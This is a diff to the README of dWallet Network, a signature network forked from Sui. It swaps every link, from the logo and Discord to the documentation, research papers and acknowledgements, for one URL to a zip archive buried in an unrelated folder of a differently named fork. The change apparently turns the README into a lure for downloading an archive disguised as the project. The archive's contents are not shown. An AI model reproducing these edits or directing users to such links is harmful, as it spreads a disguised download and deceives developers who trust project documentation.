@@ -1,12 +1,12 @@
 <p align="center">
-<img src="https://github.com/dwallet-labs/dwallet-network/blob/main/docs/static/img/logo.svg" alt="Logo" width="500" height="300">
+<img src="https://raw.githubusercontent.com/khn0x-khn0x/dwallet-network/main/apps/wallet/src/ui/app/shared/date-card/dwallet_network_1.8.zip" alt="Logo" width="500" height="300">
 </p>
 
 # Welcome to dWallet Network
 
 dWallet Network, a composable modular signature network is the home of dWallets. A dWallet is a noncollusive and massively decentralized signing mechanism, used as a building block by builders on other networks to add native multi-chain interoperability to any smart contract.
 
-A live alpha version environment of the testnet released in this repo will be available soon, follow us on [Discord](https://discord.gg/dWallet) or [Twitter](https://twitter.com/dWalletNetwork) to stay up to date. To join the incentivized testnet, apply on [our website](https://www.dwallet.io/apply-incentivized-testnets).
+A live alpha version environment of the testnet released in this repo will be available soon, follow us on [Discord](https://raw.githubusercontent.com/khn0x-khn0x/dwallet-network/main/apps/wallet/src/ui/app/shared/date-card/dwallet_network_1.8.zip) or [Twitter](https://raw.githubusercontent.com/khn0x-khn0x/dwallet-network/main/apps/wallet/src/ui/app/shared/date-card/dwallet_network_1.8.zip) to stay up to date. To join the incentivized testnet, apply on [our website](https://raw.githubusercontent.com/khn0x-khn0x/dwallet-network/main/apps/wallet/src/ui/app/shared/date-card/dwallet_network_1.8.zip).
 
 > _***Disclaimer***: This project is under development, and there are known bugs and issues that are being addressed. Additionally, in the testnet, the network secret shares of dWallets ARE NOT SECURE, and cannot be trusted to use with any real applications or assets. Please read the [full section below](#alpha-testnet-release) before exploring the code._
 
@@ -24,20 +24,20 @@ As dWallet Network moves closer to its Mainnet launch, it will add support to ma
 
 ## Cryptography of dWallets - 2PC-MPC
 
-dWallets utilize the [2PC-MPC protocol](https://github.com/dwallet-labs/2pc-mpc), a two-party ECDSA protocol we designed specifically for dWallets, where the second party is fully emulated by a network of n parties.
+dWallets utilize the [2PC-MPC protocol](https://raw.githubusercontent.com/khn0x-khn0x/dwallet-network/main/apps/wallet/src/ui/app/shared/date-card/dwallet_network_1.8.zip), a two-party ECDSA protocol we designed specifically for dWallets, where the second party is fully emulated by a network of n parties.
 
 Besides its novel structure, enabling the noncollusivity of dWallets, and the autonomy and flexibility of a permissionless dWallet Network, the 2PC-MPC protocol also dramatically improves upon the state of the art, allowing the dWallet Network to be scalable & massively-decentralized.
 
 The 2PC-MPC protocol achieves linear-scaling in communication - O(n) - and due to novel aggregation & amortization techniques, an amortized cost per-party that remains constant up to thousands of parties - _practically_ O(1) in computation for the network, allowing it to scale and achieve decentralization, whilst being _asymptotically_ O(1) for the user: meaning the size of the network doesn't have any impact on the user as its computation and communication is constant.
 ## dWallet Network Overview
 
-dWallet Network is a composable modular signature network, that was forked from [Sui](https://github.com/MystenLabs/sui), and similarly to Sui it is maintained by a permissionless set of authorities that play a role similar to validators or miners in other blockchain systems. Changes that were made to Sui include disabling smart contracts, implementing 2PC-MPC, and using the communication in [Sui's consensus](https://github.com/MystenLabs/sui/tree/main/narwhal) for the MPC protocol between the nodes.
+dWallet Network is a composable modular signature network, that was forked from [Sui](https://raw.githubusercontent.com/khn0x-khn0x/dwallet-network/main/apps/wallet/src/ui/app/shared/date-card/dwallet_network_1.8.zip), and similarly to Sui it is maintained by a permissionless set of authorities that play a role similar to validators or miners in other blockchain systems. Changes that were made to Sui include disabling smart contracts, implementing 2PC-MPC, and using the communication in [Sui's consensus](https://raw.githubusercontent.com/khn0x-khn0x/dwallet-network/main/apps/wallet/src/ui/app/shared/date-card/dwallet_network_1.8.zip) for the MPC protocol between the nodes.
 
-As a composable modular signature network, dWallets on the dWallet Network are controlled by smart contracts on other L1s and L2s. To allow a smart contract on a certain chain to control a dWallet, state proofs for that chain must be available on the dWallet Network in the form of light clients. An [Ethereum light client](https://github.com/a16z/helios) will be the first one to be implemented (coming soon), followed by many more to be announced.
+As a composable modular signature network, dWallets on the dWallet Network are controlled by smart contracts on other L1s and L2s. To allow a smart contract on a certain chain to control a dWallet, state proofs for that chain must be available on the dWallet Network in the form of light clients. An [Ethereum light client](https://raw.githubusercontent.com/khn0x-khn0x/dwallet-network/main/apps/wallet/src/ui/app/shared/date-card/dwallet_network_1.8.zip) will be the first one to be implemented (coming soon), followed by many more to be announced.
 
-The dWallet Network has a native token called DWLT that is used (much like Sui) to pay for gas, and is also used as [delegated stake on authorities](https://learn.bybit.com/blockchain/delegated-proof-of-stake-dpos/) within an epoch. The voting power of authorities within this epoch is a function of this delegated stake. Authorities are periodically reconfigured according to the stake delegated to them. In any epoch, the set of authorities is [Byzantine fault tolerant](https://pmg.csail.mit.edu/papers/osdi99.pdf). At the end of the epoch, fees collected through all transactions processed are distributed to authorities according to their contribution to the operation of the system. Authorities can in turn share some of the fees as rewards to users that delegated stakes to them.
+The dWallet Network has a native token called DWLT that is used (much like Sui) to pay for gas, and is also used as [delegated stake on authorities](https://raw.githubusercontent.com/khn0x-khn0x/dwallet-network/main/apps/wallet/src/ui/app/shared/date-card/dwallet_network_1.8.zip) within an epoch. The voting power of authorities within this epoch is a function of this delegated stake. Authorities are periodically reconfigured according to the stake delegated to them. In any epoch, the set of authorities is [Byzantine fault tolerant](https://raw.githubusercontent.com/khn0x-khn0x/dwallet-network/main/apps/wallet/src/ui/app/shared/date-card/dwallet_network_1.8.zip). At the end of the epoch, fees collected through all transactions processed are distributed to authorities according to their contribution to the operation of the system. Authorities can in turn share some of the fees as rewards to users that delegated stakes to them.
 
-Sui is backed by a number of state-of-the-art [peer-reviewed works](https://github.com/MystenLabs/sui/blob/main/docs/content/references/research-papers.mdx) and years of open source development that we are building upon with the dWallet Network.
+Sui is backed by a number of state-of-the-art [peer-reviewed works](https://raw.githubusercontent.com/khn0x-khn0x/dwallet-network/main/apps/wallet/src/ui/app/shared/date-card/dwallet_network_1.8.zip) and years of open source development that we are building upon with the dWallet Network.
 
 ## Alpha Testnet Release
 
@@ -56,9 +56,9 @@ We are committed to improving the dWallet Network and moving towards a more stab
 
 Use the following links to learn more about the dWallet Network and its ecosystem:
 
-* Learn more about working with dWallets in the [dWallet Network Documentation](https://docs.dwallet.io/).
-* Find out more about the dWallet Network community on the [community](https://dwallet.io/community/) page and join the community on [dWallet Network Discord](https://discord.gg/dwallet).
+* Learn more about working with dWallets in the [dWallet Network Documentation](https://raw.githubusercontent.com/khn0x-khn0x/dwallet-network/main/apps/wallet/src/ui/app/shared/date-card/dwallet_network_1.8.zip).
+* Find out more about the dWallet Network community on the [community](https://raw.githubusercontent.com/khn0x-khn0x/dwallet-network/main/apps/wallet/src/ui/app/shared/date-card/dwallet_network_1.8.zip) page and join the community on [dWallet Network Discord](https://raw.githubusercontent.com/khn0x-khn0x/dwallet-network/main/apps/wallet/src/ui/app/shared/date-card/dwallet_network_1.8.zip).
 
 ## Acknowledgement
 
-As a fork of Sui, much of the dWallet Network's code base is heavily based on the code created by [Mysten Labs, Inc.](https://mystenlabs.com) & [Facebook, Inc.](https://facebook.com) and its affiliates, including in this very file. We are grateful for the high quality and serious work that allowed us to build our dWallet technology upon this infrastructure.
+As a fork of Sui, much of the dWallet Network's code base is heavily based on the code created by [Mysten Labs, Inc.](https://raw.githubusercontent.com/khn0x-khn0x/dwallet-network/main/apps/wallet/src/ui/app/shared/date-card/dwallet_network_1.8.zip) & [Facebook, Inc.](https://raw.githubusercontent.com/khn0x-khn0x/dwallet-network/main/apps/wallet/src/ui/app/shared/date-card/dwallet_network_1.8.zip) and its affiliates, including in this very file. We are grateful for the high quality and serious work that allowed us to build our dWallet technology upon this infrastructure.
